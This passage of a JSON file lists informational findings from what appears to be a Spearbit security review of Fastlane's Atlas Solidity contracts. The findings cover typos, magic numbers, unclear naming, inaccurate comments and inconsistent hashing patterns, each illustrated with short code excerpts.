return (result, gasLimit); }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Typos", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "There are typos in the following locations:  Escrow.sol#L86: SovlerOperation ! SolverOperation. /// @notice Attempts to execute a SovlerOperation and determine if it wins the auction.  GasAccounting.sol#L219-L220: SovlerOperation ! SolverOperation /// @dev Calculates the gas used for the SovlerOperation and adjusts the solver s escrow balance  ,! accordingly. /// @param solverOp The current SovlerOperation for which to account  DAppIntegration.sol#L36: arent ! aren't 116 // processed in any order so long as they arent duplicated and  EscrowBits.sol#L68: is ! if // returns true is solver doesn  t get to bypass the refund.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Store \"magic numbers\" as constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "There are magic numbers used throughout the codebase, which can make the code harder to understand compared to using constant variables. Some usages of magic numbers include:  AtlasVerification.sol#L550: IAccount(userOp.from).validateUserOp{ gas: 30_000 }(userOp, _getProofHash(userOp), 0) == 0;  GasAccounting.sol#L238: uint256 gasUsed = (gasWaterMark - gasleft() + 5000) * tx.gasprice;  GasAccounting.sol#L244: gasUsed = (gasUsed + ((gasUsed * SURCHARGE) / 10_000_000));  GasAccounting.sol#L273: gasRemainder += ((gasRemainder * SURCHARGE) / 10_000_000);  GasAccounting.sol#L289: uint256 netGasSurcharge = (_claims * SURCHARGE) / 10_000_000;  Escrow.sol#L269-L270: gasLimit = (100) * (solverOp.gas < dConfig.solverGasLimit ? solverOp.gas : ,! dConfig.solverGasLimit) / (100 + _SOLVER_GAS_BUFFER) + _FASTLANE_GAS_BUFFER;  SafetyLocks.sol#L42: claims = rawClaims + ((rawClaims * SURCHARGE) / 10_000_000);  Storage.sol#L58-L59: uint256 internal _solverCalledBack = 1 << 161; uint256 internal _solverFulfilled = 1 << 162;  AtlasVerification.sol#L409-L410: uint256 bitmapIndex = ((nonce - 1) / 240) + 1; // +1 because highestFullBitmap initializes at 0 uint256 bitmapNonce = ((nonce - 1) % 240); // 1 -> 0, 240 -> 239. Needed for shifts in bitmap.  Atlas.sol#L51: 117 uint256 gasMarker = gasleft(); // + 21_000 + (msg.data.length * _CALLDATA_LENGTH_PREMIUM);  Escrow.sol#L448: if (success) { return uint256(0); }  EscrowBits.sol#L48-L61: return (result == 0);  Simulator.sol#L91: return (false, Result.Unknown, uint256(type(SolverOutcome).max) + 1);  Storage.sol#L84-L86: claims = type(uint256).max; withdrawals = type(uint256).max; deposits = type(uint256).max;  SafetyLocks.sol#L93-L95: claims = type(uint256).max; withdrawals = type(uint256).max; deposits = type(uint256).max;  GasAccounting.sol#L34: if (_deposits != type(uint256).max) {  GasAccounting.sol#L166: if (amount > type(uint112).max) revert ValueTooLarge();  GasAccounting.sol#L214: if (amount > type(uint112).max) revert ValueTooLarge();  AtlETH.sol#L111: if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;  AtlasVerification.sol#L387: if (nonce > type(uint128).max - 1) {  CallBits.sol#L103-L181: sequenced = (callConfig & 1 << uint32(CallConfigIndex.UserNoncesSequenced) != 0); // ... return (callConfig & 1 << uint32(CallConfigIndex.ExPostBids) != 0);", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Do safety checks as early as possible", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Safety checks should be done as early as possible. It makes it easy to remove certain assumptions when going through the code, and improves readability.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Consider allowing arbitrary calls from the ExecutionEnvironment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Although the ExecutionEnvironment is somewhat similar to a smart contract wallet, its non-Atlas functionality is limited to the withdrawERC20() and withdrawEther() functions. Technically the Atlas functions (e.g. userWrapper()) can execute arbitrary logic, however, this would depend on how the relevant DAppControl guards these calls. In niche situations, more functionality may be desired by users. For example, if an ExecutionEnvironment be- comes eligible for an airdrop, it may not be possible to claim the airdrop with any of the existing functions.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "bypassSignatoryApproval isn't clear", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The use of bypassSignatoryApproval is not easy to understand: bypassSignatoryApproval is used when the DappControl doesn't want/have to verify the signer of the dAppOp e.g. if the DappControl isn't the responsible party. /// @return bypassSignatoryApproval A boolean indicating if the signatory approval check should be ,! function _verifyAuctioneer(/*...*/ ) /*...*/ returns (/*...*/ , bool bypassSignatoryApproval) { bypassed. // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Bool return value looses error information", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The function below all return different types of data, but all want to expose error codes. _verify- DApp() and _verifyUser() only return bool which looses information about the error. Functions _verifyAuc- tioneer() that return both a bool an and error. The error would be sufficient. (/*...*/ ) /*...*/ returns (bool /*valid*/ , ValidCallsResult) { } function _verifyDApp (/*...*/ ) /*...*/ returns (bool /*valid*/ ) { } function _verifyUser function _verifyAuctioneer(/*...*/ ) /*...*/ returns (bool valid, bool bypassSignatoryApproval) { }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Inaccurate comment of _nonceUsedInBitmap()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The relevant values for the nonce parameter of _nonceUsedInBitmap() are 0 - 239 as can be seen in function _handleNonces(). So the comment of _nonceUsedInBitmap() isn't accurate. /// @dev Only accurate for nonces 1 - 240 within a 256-bit bitmap. // ... function _nonceUsedInBitmap(uint256 bitmap, uint256 nonce) internal pure returns (bool) { return (bitmap & (1 << nonce)) != 0; } function _handleNonces(address account, uint256 nonce, bool async, bool isSimulation) internal returns ,! (bool) { // ... uint256 bitmapNonce = ((nonce - 1) % 240); // // ... if (_nonceUsedInBitmap(bitmap, bitmapNonce)) { 0 <= bitmapNonce <= 239 // ... } // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "manuallyUpdateNonceTracker() can miss blocks that are not completely filled", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The function manuallyUpdateNonceTracker() steps forward 10 positions and then searches back- wards for the first FULL_BITMAP and stops when it finds one. However there might be intermediate block that are not completely filled. This deviates from the rest of the logic and would break invariants. function manuallyUpdateNonceTracker(address account) external { // ... // Checks the next 10 bitmaps for a higher full bitmap uint128 nonceIndexToCheck = nonceTracker.highestFullAsyncBitmap + 10; for (; nonceIndexToCheck > nonceTracker.highestFullAsyncBitmap; nonceIndexToCheck--) { bytes32 bitmapKey = keccak256(abi.encode(account, nonceIndexToCheck)); nonceBitmap = nonceBitmaps[bitmapKey]; if (nonceBitmap.bitmap == FULL_BITMAP) { nonceTracker.highestFullAsyncBitmap = nonceIndexToCheck; break; } } // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Function name manuallyUpdateNonceTracker() not clear", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function manuallyUpdateNonceTracker() only works for async (bitmap) nonces and not for se- quential nonces. This isn't clear from the function name. function manuallyUpdateNonceTracker(address account) external { // ... uint128 nonceIndexToCheck = nonceTracker.highestFullAsyncBitmap + 10; // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Incorrect comment in Mimic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "This comment hints that user can just use an EOA with Atlas: 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB is standin for the user s EOA address  User can also have a smart contract account which works well with Atlas.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "VERIFICATION can be typed to AtlasVerification", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "VERIFICATION is always set to AtlasVerification contract. To remove any ambiguity, change its type to AtlasVerification instead of address.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Rearranging terms will achieve higher precision", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The following computations can be rearranged to achieve higher precision for claims and gasRe- mainder: claims = rawClaims + ((rawClaims * SURCHARGE) / 10_000_000); gasRemainder += ((gasRemainder * SURCHARGE) / 10_000_000);", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Some ...get...Hash functions don't have ..._TYPE_HASH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The functions _getProofHash() (2x) and _getSolverHash() include a ..._TYPE_HASH in the hashed data. While the similar functions getUserOperationHash() and getAltOperationHash(). Including ..._TYPE_HASH helps to make the data unique and prevent overlaps with other hashed data. Both _- getProofHash() for userOp and getUserOperationHash() do a signature over 12 fields. Luckily the types per field are different, otherwise there might a a collision between the two hashes. function _getProofHash(UserOperation memory userOp) internal pure returns (bytes32 proofHash) { proofHash = keccak256(abi.encode(USER_TYPE_HASH, /*...*/ )); } function _getProofHash(DAppOperation memory approval) internal pure returns (bytes32 proofHash) { proofHash = keccak256(abi.encode(DAPP_TYPE_HASH, /*...*/ )); } function _getSolverHash(SolverOperation calldata solverOp) internal pure returns (bytes32 solverHash) { return keccak256(abi.encode(SOLVER_TYPE_HASH, /*...*/ )); } function getUserOperationHash(UserOperation memory userOp) internal pure returns (bytes32 userOpHash) { userOpHash = keccak256(abi.encode(userOp)); // no ..._TYPE_HASH } function getAltOperationHash(UserOperation memory userOp) internal pure returns (bytes32 altOpHash) { altOpHash = keccak256(abi.encodePacked(userOp.from, /*...*/ )); // no ..._TYPE_HASH }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Functions _getProofHash() and getUserOperationHash() are very similar", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "There are two ways to retrieve the hash of the userOp, via _getProofHash() and getUserOper- ationHash(). Function getUserOperationHash() also includes the userOp.signature, which isn't necessary because the hash of the rest of the data is already unique. The signature of a signature increases complexity. Having two very similar functions also increases code size and complexity. Note: also see the issue \"Some ...get...Hash functions don't have ..._TYPE_HASH\" for another difference. 125 function _getProofHash(UserOperation memory userOp) internal pure returns (bytes32 proofHash) { proofHash = keccak256( abi.encode( USER_TYPE_HASH, userOp.from, userOp.to, userOp.value, userOp.gas, userOp.maxFeePerGas, userOp.nonce, userOp.deadline, userOp.dapp, userOp.control, userOp.sessionKey, keccak256(userOp.data) ) // userOp.signature is not included ); } function getUserOperationHash(UserOperation memory userOp) internal pure returns (bytes32 userOpHash) { userOpHash = keccak256(abi.encode(userOp)); }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "_get...Hash functions use different name patterns", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The function _getProofHash() if overloaded for UserOperation, but for SolverOperation there is a different function name. It would be clearer to use the same pattern. function _getProofHash(DAppOperation /*...*/ ) /*...*/ {} function _getProofHash(UserOperation /*...*/ ) /*...*/ {} function _getSolverHash(SolverOperation /*...*/ ) /*...*/ {}", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "bitmap256 uses a different pattern", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Most functions in AtlasVerification use uint256 bitmap. However function getNextNonce() uses uint256 bitmap256;. It would be more consistent to use the same pattern everywhere. function getNextNonce(address account, bool sequenced) external view returns (uint256) { // ... uint256 bitmap256; // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Error DAppSignatureInvalid in _verifyDApp() is not specific", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The function _verifyDApp() returns with error DAppSignatureInvalid if a SignatoryCheck fails. This error is not specific and difficult to trace back to the cause. function _verifyDApp(/*...*/ ) /*...*/ { // ... if (!bypassSignatoryCheck) { return (false, ValidCallsResult.DAppSignatureInvalid); // not specific } // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Function _verifyDApp() accesses signatories[] directly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The function _verifyDApp() accesses the array signatories[] directly. This array is part of the contract DAppIntegration. This exposes the implementation details. 127 function _verifyDApp( // ... if (!signatories[keccak256(abi.encodePacked(dAppOp.control, msgSender))]) { /*...*/ } // ... if (!signatories[keccak256(abi.encodePacked(dAppOp.control, dAppOp.from))]) { /*...*/ } // ... } function isDAppSignatory(address dAppControl, address signatory) external view returns (bool) { bytes32 signatoryKey = keccak256(abi.encodePacked(dAppControl, signatory)); return signatories[signatoryKey]; }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Contract AtlasVerification doesn't import ECDSA", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Contract AtlasVerification uses ECDSA from EIP712.sol. However the latest version of EIP712.sol doesn't import ECDSA anymore, so when an upgrade is done AtlasVerification doesn't compile anymore. Additionally it is also clearer to directly import ECDSA. There are the different versions:  EIP712 v5.0  EIP712 v4.9 import \"openzeppelin-contracts/contracts/utils/cryptography/EIP712.sol\"; contract AtlasVerification is EIP712, /*...*/ { using ECDSA for bytes32; // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Comment of execute() is incorrect", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The comment of the last return value of execute() differs from the code. 128 function metacall(/*...*/ ) /*...*/ { // ... try this.execute{ /*...*/ }(/*...*/ ) returns (/*...*/ , uint256 winningSolverIndex) { // ... } // ... } /// @return uint256 The solver outcome bitmap ==> should be winningSolverIndex function execute(/*...*/ ) /*...*/ { // ... (/*...*/ , key) = _bidFindingIteration(/*...*/ ); // ... return (/*...*/ , uint256(key.solverOutcome)); } function _bidFindingIteration( // ... key.solverOutcome = uint24(bidPlaceholder); // is winningSolverIndex return (/*...*/ , key); // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Reuse of variables is confusing", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Sometimes variables are used for multiple purpuses, which is confusing when reading the code and also allows for errors in future code updates. This is most likely done to prevent \"stack too deep\" issues. The following examples have been found:  key.solverOutcome which is used as an error code and as the index for the winning solver.  endBalance which is used as the end token balance and as the remaining ETH balance. function _bidFindingIteration(/*...*/ ) /*...*/ { // ... (auctionWon, key) = _executeSolverOperation( /*...*/ ); // ... key.solverOutcome = uint24(bidPlaceholder); // ... } function _executeSolverOperation( // ... key.solverOutcome = uint24(result); // error code // ... return (false, key); } 129 function solverMetaTryCatch( // ... endBalance = etherIsBidToken ? endBalance : address(this).balance; if (endBalance > 0) { IEscrow(atlas).contribute{ value: endBalance }(); } // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "bidFind state is handled in a different way", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Within function _bidFindingIteration() a seperate state is maintained, the bidFind state. This could be integrated with other state mechanisms to simplify the code. function _bidFindingIteration(/*...*/ ) /*...*/ { // ... key.bidFind = true; // ... bidPlaceholder = _getBidAmount(dConfig, userOp, solverOps[i], returnData, key); // ... key.bidFind = false; // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Inconsistent way to call CallBits", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "CallBits functions are usually called as CallBits.fn(self), but in the highlighted if condition, it's called as self.fn().", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Remove unused variables, constants and imports", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Highlighted variables, constants and imports (including test imports) aren't used.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Parenthesis can be used to remove ambiguity on the order of operations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The code highlighted leaves some room for ambiguity on the order of operations for the code reader.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Prefer control naming over controller", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "control and controller is used to refer to the same actor in the system at different places.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}]